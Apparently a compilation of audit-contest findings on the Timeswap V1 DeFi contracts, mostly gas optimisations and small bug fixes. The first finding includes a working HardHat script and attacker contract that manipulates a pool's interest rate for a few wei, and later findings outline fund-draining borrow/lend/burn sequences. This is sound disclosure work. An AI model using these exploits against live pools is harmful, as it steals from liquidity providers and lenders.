# Handle  Rhynorater   # Vulnerability details  ## Impact Due to lack of constraints on user input in the `TimeswapPair.sol#mint` function, an attacker can arbitrarily modify the interest rate while only paying a minimal amount of Asset Token and Collateral Token.   Disclosure: This is my first time attempting Ethereum hacking, so I might have made some mistakes here since the math is quite complex, but I'm going to give it a go.   ## Proof of Concept The attack scenario is this: A malicious actor is able to hyper-inflate the interest rate on a pool by triggering a malicious mint function. The malicious actor does this to attack the LP and other members of the pool.   Consider the following HardHat script: ``` const hre = require("hardhat");   //jtok is asset //usdc is collat  async function launchTestTokens(tokenDeployer){     //Launch a token     const TestToken = await ethers.getContractFactory("TestToken", signer=tokenDeployer);     const tt = await TestToken.deploy("JTOK", "JTOK", 1000000000000000)     const tt2 = await TestToken.deploy("USDC", "USDC", 1000000000000000)     let res = await tt.balanceOf(tokenDeployer.address)     let res2 = await tt.balanceOf(tokenDeployer.address)     console.log("JTOK balance: "+res)     console.log("USDC balance: "+res2)     return [tt, tt2] }  async function deployAttackersContract(attacker, jtok, usdc){     const Att = await ethers.getContractFactory("Attacker", signer=attacker)     const atakcontrak = await Att.deploy(jtok.address, usdc.address)     return atakcontrak }  async function deployLPContract(lp, jtok, usdc){     const LP = await ethers.getContractFactory("LP", signer=lp)     const lpc = await LP.deploy(jtok.address, usdc.address)     return lpc }  async function main() {     const [tokenDeployer, lp, attacker] = await ethers.getSigners();     let balance = await tokenDeployer.getBalance()     let factory = await ethers.getContractAt("TimeswapFactory", "0x5FbDB2315678afecb367f032d93F642f64180aa3", signer=tokenDeployer)     //let [jtok, usdc] = await launchTestTokens(tokenDeployer)     let jtok = await ethers.getContractAt("TestToken", "0x2279b7a0a67db372996a5fab50d91eaa73d2ebe6", signer=tokenDeployer)     let usdc = await ethers.getContractAt("TestToken", "0x8a791620dd6260079bf849dc5567adc3f2fdc318", signer=tokenDeployer)     console.log("Jtok: "+jtok.address)     console.log("USDC: "+usdc.address)      //Create Pair     //let txn = await factory.createPair(jtok.address, usdc.address)     pairAddress = await factory.getPair(jtok.address, usdc.address)     pair = await ethers.getContractAt("TimeswapPair", pairAddress, signer=tokenDeployer)     console.log("Pair address: "+pairAddress);      // Deploy LP     //let lpc = await deployLPContract(lp, jtok, usdc)     let lpc = await ethers.getContractAt("LP", "0x948b3c65b89df0b4894abe91e6d02fe579834f8f", signer=lp)       let jtokb = await jtok.balanceOf(lpc.address)     let usdcb = await usdc.balanceOf(lpc.address)     console.log("LP Jtok: "+jtokb)     console.log("LP USDC: "+usdcb)      //let txn2 = await lpc.timeswapMint(1641859791, 15, pairAddress)     let res = await pair.constantProduct(1641859791);     console.log("Post LP Constants:", res);      let atakcontrak = await deployAttackersContract(attacker, jtok, usdc)      jtokb = await jtok.balanceOf(atakcontrak.address)     usdcb = await usdc.balanceOf(atakcontrak.address)     console.log("Attacker Jtok: "+jtokb)     console.log("Attacker USDC: "+usdcb)      //mint some tokens     let txn2 = await atakcontrak.timeswapMint(1641859791, 15, pairAddress)      let res2 = await pair.constantProduct(1641859791);     console.log("Post Attack Constants:", res2);  } main().then(()=>process.exit(0))  ```  First, the LP deploys their pool and contributes their desired amount of tokens with the below contract: ``` pragma solidity =0.8.4;  import "hardhat/console.sol"; import {ITimeswapMintCallback} from "./interfaces/callback/ITimeswapMintCallback.sol"; import {IPair} from "./interfaces/IPair.sol"; import {IERC20} from '@openzeppelin/contracts/token/ERC20/IERC20.sol'; interface TestTokenLP is IERC20{     function mmint(uint256 amount) external; }  contract LP is ITimeswapMintCallback {      uint112 constant SEC_PER_YEAR = 31556926;     TestTokenLP internal jtok;     TestTokenLP internal usdc;  constructor(address _jtok, address _usdc){     jtok = TestTokenLP(_jtok);     jtok.mmint(10_000 ether);     usdc = TestTokenLP(_usdc);     usdc.mmint(10_000 ether); }  function timeswapMint(uint maturity, uint112 APR, address pairAddress) public{     uint256 maturity = maturity;     console.log("Maturity: ", maturity);     address liquidityTo = address(this);     address dueTo = address(this);     uint112 xIncrease = 5_000 ether;     uint112 yIncrease = (APR*xIncrease)/(SEC_PER_YEAR*100);     uint112 zIncrease = (5*xIncrease)/3; //Static 167% CDP     IPair(pairAddress).mint(maturity, liquidityTo, dueTo, xIncrease, yIncrease, zIncrease, ""); }   function timeswapMintCallback(         uint112 assetIn,         uint112 collateralIn,         bytes calldata data     ) override external{         jtok.mmint(100_000 ether);         usdc.mmint(100_000 ether);         console.log("Asset requested:", assetIn);         console.log("Collateral requested:", collateralIn);         //check before         uint256 beforeJtok = jtok.balanceOf(msg.sender);         console.log("LP jtok before", beforeJtok);         //transfer         jtok.transfer(msg.sender, assetIn);         //check after         uint256 afterJtok = jtok.balanceOf(msg.sender);         console.log("LP jtok after", afterJtok);         //check before         uint256 beforeUsdc = usdc.balanceOf(msg.sender);         console.log("LP USDC  before", beforeUsdc);         //transfer         usdc.transfer(msg.sender, collateralIn);         //check after         uint256 afterUsdc = usdc.balanceOf(msg.sender);         console.log("LP USDC After", afterUsdc);              } }  ``` Here are the initialization values: ```     uint112 xIncrease = 5_000 ether;     uint112 yIncrease = (APR*xIncrease)/(SEC_PER_YEAR*100);     uint112 zIncrease = (5*xIncrease)/3; //Static 167% CDP ``` With this configuration, I've calculated the interest rate to borrow on this pool using the functions defined here: https://timeswap.gitbook.io/timeswap/deep-dive/borrowing to  be: ``` yMax: 4.7533146923118e-06 Min Interest Rate: 0.009374999999999765 Max Interest Rate: 0.14999999999999625 zMax: 1666.6666666666667  ``` Around 1% to 15%.   Then, the attacker comes along (see line containing `let atakcontrak` and after). The attacker deploys the following contract: ``` pragma solidity =0.8.4;  import "hardhat/console.sol"; import {ITimeswapMintCallback} from "./interfaces/callback/ITimeswapMintCallback.sol"; import {IPair} from "./interfaces/IPair.sol"; import {IERC20} from '@openzeppelin/contracts/token/ERC20/IERC20.sol'; interface TestTokenAtt is IERC20{     function mmint(uint256 amount) external; }  contract Attacker is ITimeswapMintCallback {      uint112 constant SEC_PER_YEAR = 31556926;     TestTokenAtt internal jtok;     TestTokenAtt internal usdc;  constructor(address _jtok, address _usdc){     jtok = TestTokenAtt(_jtok);     jtok.mmint(10_000 ether);     usdc = TestTokenAtt(_usdc);     usdc.mmint(10_000 ether); }  function timeswapMint(uint maturity, uint112 APR, address pairAddress) public{     uint256 maturity = maturity;     console.log("Maturity: ", maturity);     address liquidityTo = address(this);     address dueTo = address(this);     uint112 xIncrease = 3;     uint112 yIncrease = 1000000000000000;     uint112 zIncrease = 5; //Static 167% CDP     IPair(pairAddress).mint(maturity, liquidityTo, dueTo, xIncrease, yIncrease, zIncrease, ""); }   function timeswapMintCallback(         uint112 assetIn,         uint112 collateralIn,         bytes calldata data     ) override external{         jtok.mmint(100_000 ether);         usdc.mmint(100_000 ether);         console.log("Asset requested:", assetIn);         console.log("Collateral requested:", collateralIn);         //check before         uint256 beforeJtok = jtok.balanceOf(msg.sender);         console.log("Attacker jtok before", beforeJtok);         //transfer         jtok.transfer(msg.sender, assetIn);         //check after         uint256 afterJtok = jtok.balanceOf(msg.sender);         console.log("Attacker jtok after", afterJtok);         //check before         uint256 beforeUsdc = usdc.balanceOf(msg.sender);         console.log("Attacker USDC  before", beforeUsdc);         //transfer         usdc.transfer(msg.sender, collateralIn);         //check after         uint256 afterUsdc = usdc.balanceOf(msg.sender);         console.log("Attacker USDC After", afterUsdc);              } } ```  Which contains the following settings for a mint: ```     uint112 xIncrease = 3;     uint112 yIncrease = 1000000000000000;     uint112 zIncrease = 5; //Static 167% CDP ```  According to my logs in hardhat: ```     Maturity:  1641859791     Callback before: 8333825816710789998373     Asset requested: 3     Collateral requested: 6     Attacker jtok before 5000000000000000000000     Attacker jtok after 5000000000000000000003     Attacker USDC  before 8333825816710789998373     Attacker USDC After 8333825816710789998379     Callback after: 8333825816710789998379     Callback expected after: 8333825816710789998379  ``` The attacker is only required to pay 3 wei of Asset Token and 6 wei of Collateral token. However, after the attacker's malicious mint is up, the interest rate becomes: ``` yMax: 0.0002047533146923118 Min Interest Rate: 0.40383657499999975 Max Interest Rate: 6.461385199999996 zMax: 1666.6666666666667 ``` Between 40 and 646 percent.   xyz values before and after: ``` Post LP Constants: [ BigNumber { value: "5000000000000000000000" },   BigNumber { value: "23766573461559" },   BigNumber { value: "8333333333333333333333" },   x: BigNumber { value: "5000000000000000000000" },   y: BigNumber { value: "23766573461559" },   z: BigNumber { value: "8333333333333333333333" } ] Attacker Jtok: 10000000000000000000000 Attacker USDC: 10000000000000000000000 Post Attack Constants: [ BigNumber { value: "5000000000000000000003" },   BigNumber { value: "1023766573461559" },   BigNumber { value: "8333333333333333333338" },   x: BigNumber { value: "5000000000000000000003" },   y: BigNumber { value: "1023766573461559" },   z: BigNumber { value: "8333333333333333333338" } ]  ```  This result in destruction of the pool.   
# Handle  Rhynorater   # Vulnerability details  In `BurnMath.sol` we have the following function defined; ```     function getAsset(IPair.State memory state, uint256 liquidityIn) internal pure returns (uint128 assetOut) {         if (state.reserves.asset <= state.totalClaims.bond) return assetOut;          uint256 _assetOut = state.reserves.asset;         _assetOut -= state.totalClaims.bond;         _assetOut = _assetOut.mulDiv(liquidityIn, state.totalLiquidity);         assetOut = _assetOut.toUint128(); } ``` Since the above `if` statement ensures that `state.reserves.asset` is  not less than or equal to `state.totalClaims.bond`, it is impossible for the `_assetOut -= state.totalClaims.bond; ` line to underflow. As a result, adding the `unchecked` directive around this will save on gas.  By the same reasoning, in the `getCollateral` function: ``` deficit -= state.reserves.asset; ``` is already checked by the  ``` if (state.reserves.asset >= state.totalClaims.bond) { ``` `if` statement. Surrounding this with `unchecked` will also save on gas.  Lastly, this also applies in `WithdrawMath.sol#getCollateral`: ```         if (state.reserves.asset >= state.totalClaims.bond) return collateralOut;         uint256 deficit = state.totalClaims.bond;         deficit -= state.reserves.asset; ``` The deficit will never underflow here, so adding `unchecked` will save on gas.   ##References https://github.com/code-423n4/2022-01-timeswap/blob/5960e07d39f2b4a60cfabde1bd51f4b1e62e7e85/Timeswap/Timeswap-V1-Core/contracts/libraries/BurnMath.sol#L22 https://github.com/code-423n4/2022-01-timeswap/blob/5960e07d39f2b4a60cfabde1bd51f4b1e62e7e85/Timeswap/Timeswap-V1-Core/contracts/libraries/BurnMath.sol#L41 https://github.com/code-423n4/2022-01-timeswap/blob/5960e07d39f2b4a60cfabde1bd51f4b1e62e7e85/Timeswap/Timeswap-V1-Core/contracts/libraries/WithdrawMath.sol#L33   
# Handle  WatchPug   # Vulnerability details  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/NFTTokenURIScaffold.sol#L132-L132  ```solidity if (significantDigits > 10 ** 9) { ```  Can be changed to:  ```solidity if (significantDigits > 1e9) { ```  
# Handle  WatchPug   # Vulnerability details  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/SquareRoot.sol#L19-L22  ```solidity function sqrtUp(uint256 y) internal pure returns (uint256 z) {     z = sqrt(y);     if (z % y > 0) z++; } ```  For example, when `y = 9`: -   At L20, z = sqrt(9) = 3 -   At L21, z % y = 3 % 9 = 3, so that `z % y > 0` is true, therefore, `z++`, z is 4   Expected Results: sqrtUp(9) = 4  Actual Results: sqrtUp(9) = 3  ### Recommendation  Change to:  ```solidity function sqrtUp(uint256 y) internal pure returns (uint256 z) {     z = sqrt(y);     if (z * z < y) ++z; } ``` or  ```solidity function sqrtUp(uint256 y) internal pure returns (uint256 z) {     z = sqrt(y);     if (y % z != 0) ++z; } ```  
# Handle  WatchPug   # Vulnerability details  The check of `y > 3` is unnecessary and most certainly adds more gas cost than it saves as the majority of use cases of this function will not be handling `y <= 3`.  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/SquareRoot.sol#L6-L17  ```solidity function sqrt(uint256 y) internal pure returns (uint256 z) {     if (y > 3) {         z = y;         uint256 x = y / 2 + 1;         while (x < z) {             z = x;             x = (y / x + x) / 2;         }     } else if (y != 0) {         z = 1;     } } ```  ### Recommendation  Change to:  ```solidity function sqrt(uint x) public pure returns (uint y) {     uint z = (x + 1) / 2;     y = x;     while (z < y) {         y = z;         z = (x / z + z) / 2;     } } ```  Or use:  https://github.com/Rari-Capital/solmate/blob/dd13c61b5f9cb5c539a7e356ba94a6c2979e9eb9/src/utils/FixedPointMathLib.sol#L150-L205   
# Handle  WatchPug   # Vulnerability details  Check input value earlier can avoid unnecessary code execution when this check failed.  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/SafeCast.sol#L13-L15  ```solidity function toUint128(uint256 x) internal pure returns (uint128 y) {     require((y = uint128(x)) == x); } ```  See: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/4961a51cc736c7d4aa9bd2e11e4cbbaff73efee9/contracts/utils/math/SafeCast.sol#L48  ### Recommendation  Change to:  ```solidity function toUint128(uint256 value) internal pure returns (uint128) {     require(value <= type(uint128).max, "SafeCast: value doesn't fit in 128 bits");     return uint128(value); } ```  `SafeCast.sol#toUint112()` got the similar issue.  
# Handle  0x0x0x   # Vulnerability details  ## Impact  `!= 0` is a cheaper operation compared to `> 0`, when dealing with `uint`.  ## Occurrences  ```  ./Timeswap-V1-Convenience/contracts/base/ERC721.sol:147:            } else if (_return.length > 0) { ./Timeswap-V1-Convenience/contracts/libraries/Burn.sol:40:        if (tokensOut.asset > 0) { ./Timeswap-V1-Convenience/contracts/libraries/Burn.sol:65:        if (tokensOut.collateral > 0) { ./Timeswap-V1-Convenience/contracts/libraries/DateTime.sol:128:        if (year >= 1970 && month > 0 && month <= 12) { ./Timeswap-V1-Convenience/contracts/libraries/DateTime.sol:130:            if (day > 0 && day <= daysInMonth) { ./Timeswap-V1-Convenience/contracts/libraries/Mint.sol:296:        require(pair.totalLiquidity(params.maturity) > 0, 'E507'); ./Timeswap-V1-Convenience/contracts/libraries/Mint.sol:455:        require(pair.totalLiquidity(params.maturity) > 0, 'E507'); ./Timeswap-V1-Convenience/contracts/libraries/Mint.sol:614:        require(pair.totalLiquidity(params.maturity) > 0, 'E507'); ./Timeswap-V1-Convenience/contracts/libraries/Pay.sol:86:        if (collateralOut > 0) { ./Timeswap-V1-Convenience/contracts/libraries/PayMath.sol:27:                if (due.debt > 0) { ./Timeswap-V1-Convenience/contracts/libraries/SquareRoot.sol:21:        if (z % y > 0) z++; ./Timeswap-V1-Convenience/contracts/libraries/Withdraw.sol:40:        if (tokensOut.asset > 0) { ./Timeswap-V1-Convenience/contracts/libraries/Withdraw.sol:58:        if (tokensOut.collateral > 0) { ./Timeswap-V1-Convenience/contracts/libraries/Withdraw.sol:75:        if (params.claimsIn.bond > 0) ./Timeswap-V1-Convenience/contracts/libraries/Withdraw.sol:77:        if (params.claimsIn.insurance > 0) ./Timeswap-V1-Core/contracts/TimeswapPair.sol:153:        require(xIncrease > 0 && yIncrease > 0 && zIncrease > 0, 'E205'); ./Timeswap-V1-Core/contracts/TimeswapPair.sol:170:        require(liquidityOut > 0, 'E212'); ./Timeswap-V1-Core/contracts/TimeswapPair.sol:203:        require(liquidityIn > 0, 'E205'); ./Timeswap-V1-Core/contracts/TimeswapPair.sol:217:        if (tokensOut.asset > 0) asset.safeTransfer(assetTo, tokensOut.asset); ./Timeswap-V1-Core/contracts/TimeswapPair.sol:218:        if (tokensOut.collateral > 0) collateral.safeTransfer(collateralTo, tokensOut.collateral); ./Timeswap-V1-Core/contracts/TimeswapPair.sol:236:        require(xIncrease > 0, 'E205'); ./Timeswap-V1-Core/contracts/TimeswapPair.sol:239:        require(pool.state.totalLiquidity > 0, 'E206'); ./Timeswap-V1-Core/contracts/TimeswapPair.sol:274:        require(claimsIn.bond > 0 || claimsIn.insurance > 0, 'E205'); ./Timeswap-V1-Core/contracts/TimeswapPair.sol:292:        if (tokensOut.asset > 0) asset.safeTransfer(assetTo, tokensOut.asset); ./Timeswap-V1-Core/contracts/TimeswapPair.sol:293:        if (tokensOut.collateral > 0) collateral.safeTransfer(collateralTo, tokensOut.collateral); ./Timeswap-V1-Core/contracts/TimeswapPair.sol:311:        require(xDecrease > 0, 'E205'); ./Timeswap-V1-Core/contracts/TimeswapPair.sol:314:        require(pool.state.totalLiquidity > 0, 'E206'); ./Timeswap-V1-Core/contracts/TimeswapPair.sol:369:        if (assetIn > 0) Callback.pay(asset, assetIn, data); ./Timeswap-V1-Core/contracts/TimeswapPair.sol:374:        if (collateralOut > 0) collateral.safeTransfer(to, collateralOut); ./Timeswap-V1-Core/contracts/libraries/FullMath.sol:34:                require(denominator > 0); ./Timeswap-V1-Core/contracts/libraries/FullMath.sol:124:        if (mulmod(a, b, denominator) > 0) result++; ./Timeswap-V1-Core/contracts/libraries/Math.sol:7:        if (x % y > 0) z++;  ```  
# Handle  WatchPug   # Vulnerability details  Every reason string takes at least 32 bytes.  Use short reason strings that fits in 32 bytes or it will become more expensive.  Instances include:  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/base/ERC721.sol#L55-L58  ```solidity require(     owner == msg.sender || isApprovedForAll[owner][msg.sender],     'ERC721 :: approve : Approve caller is not owner nor approved for all' ); ```  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/base/ERC721.sol#L96-L99  ```solidity require(     _checkOnERC721Received(address(0), to, id, ''),     'ERC721 :: _safeMint : Transfer to non ERC721Receiver implementer' ); ```  
# Handle  WatchPug   # Vulnerability details  There is no risk of overflow caused by increamenting the iteration index in for loops (the `i++` in for `for (uint256 i; i < ids.length; i++)`).  Increments perform overflow checks that are not necessary in this case.  ### Recommendation  Surround the increment expressions with an `unchecked { ... }` block to avoid the default overflow checks. For example, change the for loop:   https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/PayMath.sol#L21-L33  ```solidity for (uint256 i; i < ids.length; i++) {     IPair.Due memory due = pair.dueOf(maturity, address(collateralizedDebt), ids[i]);      if (assetsIn[i] > due.debt) assetsIn[i] = due.debt;     if (msg.sender == collateralizedDebt.ownerOf(ids[i])) {         uint256 _collateralOut = due.collateral;         if (due.debt > 0) {             _collateralOut *= assetsIn[i];             _collateralOut /= due.debt;         }         collateralsOut[i] = _collateralOut.toUint112();     } } ```  to:  ```solidity for (uint256 i; i < ids.length;) {     IPair.Due memory due = pair.dueOf(maturity, address(collateralizedDebt), ids[i]);      if (assetsIn[i] > due.debt) assetsIn[i] = due.debt;     if (msg.sender == collateralizedDebt.ownerOf(ids[i])) {         uint256 _collateralOut = due.collateral;         if (due.debt > 0) {             _collateralOut *= assetsIn[i];             _collateralOut /= due.debt;         }         collateralsOut[i] = _collateralOut.toUint112();     }      unchecked { ++i; } } ```   
# Handle  WatchPug   # Vulnerability details  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/BorrowMath.sol#L19-L53  This issue is similar to the two previous issues related to `state.y` manipulation. Unlike the other two issues, this function is not on `TimeswapPair.sol` but on `TimeswapConvenience.sol`, therefore this can not be solved by adding `onlyConvenience` modifier.  Actually, we believe that it does not make sense for the caller to specify the interest they want to pay, we recommend removing this function.  ## Impact  - When `pool.state.y` is extremely large, many core features of the protocol will malfunction, as the arithmetic related to `state.y` can overflow. For example:  LendMath.check(): https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/LendMath.sol#L28-L28  BorrowMath.check(): https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/BorrowMath.sol#L31-L31  - An attacker can set `state.y` to a near overflow value, then `lend()` to get a large amount of extra interest (as Bond tokens) with a small amount of asset tokens. This way, the attacker can steal funds from other lenders and liquidity providers.   
# Handle  WatchPug   # Vulnerability details  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/MintMath.sol#L14-L34  The current implementation of `TimeswapPair.sol#mint()` allows the caller to specify an arbitrary value for `yIncrease`.  However, since `state.y` is expected to be a large number based at `2**32`, once the initial `state.y` is set to a small number (1 wei for example), the algorithm won't effectively change `state.y` with regular market operations (`borrow`, `lend` and `mint`).  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/BorrowMath.sol#L17-L37  The pair with the maturity will malfunction and can only be abandoned.  A malicious user/attacker can use this to frontrun other users or the platform's `newLiquidity()` call to initiate a griefing attack.  If the desired `maturity` is a meaningful value for the user/platform, eg, end of year/quarter. This can be a noteworthy issue.  ## Recommendation  Consider adding validation of minimal `state.y` for new liquidity.  Can be `2**32 / 10000` for example.  
# Handle  WatchPug   # Vulnerability details  `checkProportional()` is a rather simple one line function, making it inline instead of an internal function call can make the code simpler and save some gas.  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L359-L368  ```solidity for (uint256 i; i < ids.length; i++) {     Due storage due = dues[ids[i]];     require(due.startBlock != BlockNumber.get(), 'E207');     if (owner != msg.sender) require(collateralsOut[i] == 0, 'E213');     PayMath.checkProportional(assetsIn[i], collateralsOut[i], due);     due.debt -= assetsIn[i];     due.collateral -= collateralsOut[i];     assetIn += assetsIn[i];     collateralOut += collateralsOut[i]; } ```  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/PayMath.sol#L7-L14  ```solidity function checkProportional(     uint112 assetIn,     uint112 collateralOut,     IPair.Due memory due ) internal pure {     require(uint256(assetIn) * due.collateral >= uint256(collateralOut) * due.debt, 'E303'); } } ```  Can be changed to:  ```solidity for (uint256 i; i < ids.length; i++) {     Due storage due = dues[ids[i]];     require(due.startBlock != BlockNumber.get(), 'E207');     if (owner != msg.sender) require(collateralsOut[i] == 0, 'E213');     require(uint256(assetIn[i]) * due.collateral >= uint256(collateralOut[i]) * due.debt, 'E303');     due.debt -= assetsIn[i];     due.collateral -= collateralsOut[i];     assetIn += assetsIn[i];     collateralOut += collateralsOut[i]; } ```   
# Handle  WatchPug   # Vulnerability details  In the current implementation, `borrow()` takes a user input value of `zIncrease`, while the actual collateral asset transferred in is calculated at L319, the state of `pool.state.z` still increased by the value of the user's input at L332.  Even though a large number of `zIncrease` means that the user needs to add more collateral, the attacker can use a dust amount `xDecrease` (1 wei for example) so that the total collateral needed is rather small.  Plus, the attacker can always `pay()` the dust amount of loan to get back the rather large amount of collateral added.  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L299-L338  ```solidity function borrow(     uint256 maturity,     address assetTo,     address dueTo,     uint112 xDecrease,     uint112 yIncrease,     uint112 zIncrease,     bytes calldata data ) external override lock returns (uint256 id, Due memory dueOut) {     require(block.timestamp < maturity, 'E202');     require(assetTo != address(0) && dueTo != address(0), 'E201');     require(assetTo != address(this) && dueTo != address(this), 'E204');     require(xDecrease > 0, 'E205');      Pool storage pool = pools[maturity];     require(pool.state.totalLiquidity > 0, 'E206');      BorrowMath.check(pool.state, xDecrease, yIncrease, zIncrease, fee);      dueOut.debt = BorrowMath.getDebt(maturity, xDecrease, yIncrease);     dueOut.collateral = BorrowMath.getCollateral(maturity, pool.state, xDecrease, zIncrease);     dueOut.startBlock = BlockNumber.get();      Callback.borrow(collateral, dueOut.collateral, data);      id = pool.dues[dueTo].insert(dueOut);      pool.state.reserves.asset -= xDecrease;     pool.state.reserves.collateral += dueOut.collateral;     pool.state.totalDebtCreated += dueOut.debt;      pool.state.x -= xDecrease;     pool.state.y += yIncrease;     pool.state.z += zIncrease;      asset.safeTransfer(assetTo, xDecrease);      emit Sync(maturity, pool.state.x, pool.state.y, pool.state.z);     emit Borrow(maturity, msg.sender, assetTo, dueTo, xDecrease, id, dueOut); } ```  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/BorrowMath.sol#L62-L79  ```solidity function getCollateral(     uint256 maturity,     IPair.State memory state,     uint112 xDecrease,     uint112 zIncrease ) internal view returns (uint112 collateralIn) {     uint256 _collateralIn = maturity;     _collateralIn -= block.timestamp;     _collateralIn *= zIncrease;     _collateralIn = _collateralIn.shiftRightUp(25);     uint256 minimum = state.z;     minimum *= xDecrease;     uint256 denominator = state.x;     denominator -= xDecrease;     minimum = minimum.divUp(denominator);     _collateralIn += minimum;     collateralIn = _collateralIn.toUint112(); } ```  ## PoC  Near the maturity time, the attacker can do the following:  1. `borrow()` a dust amount of assets (`xDecrease` = 1 wei) and increase `pool.state.z` to an extremely large value (20x of previous `state.z` in our tests); 2. `pay()` the loan and get back the collateral; 3. `lend()` a regular amount of `state.x`, get a large amount of insurance token; 4. `burn()` the insurance token and get a large portion of the collateral assets from the defaulted loans.  ## Recommendation  Consider making `pair.borrow()` to be `onlyConvenience`, so that `zIncrease` will be a computed value (based on `xDecrease` and current state) rather than a user input value.  
# Handle  WatchPug   # Vulnerability details  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/DateTime.sol#L127-L134  ```solidity     function isValidDate(uint year, uint month, uint day) internal pure returns (bool valid) {         if (year >= 1970 && month > 0 && month <= 12) {             uint daysInMonth = _getDaysInMonth(year, month);             if (day > 0 && day <= daysInMonth) {                 valid = true;             }         }     } ```  The local variable `daysInMonth` is used only once. Making the expression inline can save gas.  ### Recommendation  Change to:  ```solidity     function isValidDate(uint year, uint month, uint day) internal pure returns (bool valid) {         if (year >= 1970 && month > 0 && month <= 12) {             if (day > 0 && day <= _getDaysInMonth(year, month)) {                 valid = true;             }         }     } ```  Other examples include:  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/Burn.sol#L76-L77  ```solidity         IPair pair = factory.getPair(params.asset, params.collateral);         require(address(pair) != address(0), 'E501'); ```  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/TimeswapConvenience.sol#L556-L558  ```solidity         IDue collateralizedDebt = natives[asset][collateral][maturity].collateralizedDebt;          require(msg.sender == address(collateralizedDebt), 'E701'); ```  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/Callback.sol#L62-L63  ```solidity         uint256 _assetReserve = asset.safeBalance();         require(_assetReserve >= assetReserve + assetIn, 'E304'); ```  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/Callback.sol#L51-L52  ```solidity         uint256 _collateralReserve = collateral.safeBalance();         require(_collateralReserve >= collateralReserve + collateralIn, 'E305'); ```  
# Handle  WatchPug   # Vulnerability details  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/Callback.sol#L5-L5  ```solidity import {IPair} from '../interfaces/IPair.sol'; ```  `IPair` is unused in `Callback.sol`.  
# Handle  WatchPug   # Vulnerability details  `flag == 0` is cheaper than `temp % 10 == 0`.   Therefore, checking `flag == 0 `first can save some gas.  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/NFTTokenURIScaffold.sol#L162-L162  ```solidity if (temp % 10 == 0 && flag == 0) ```  ### Recommendation  Change to:  ```solidity     if (flag == 0 && temp % 10 == 0)  ```  Other instances include:  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/NFTTokenURIScaffold.sol#L180-L180  ```solidity else if (value % 10 != 0 && flag == 0)  ```  
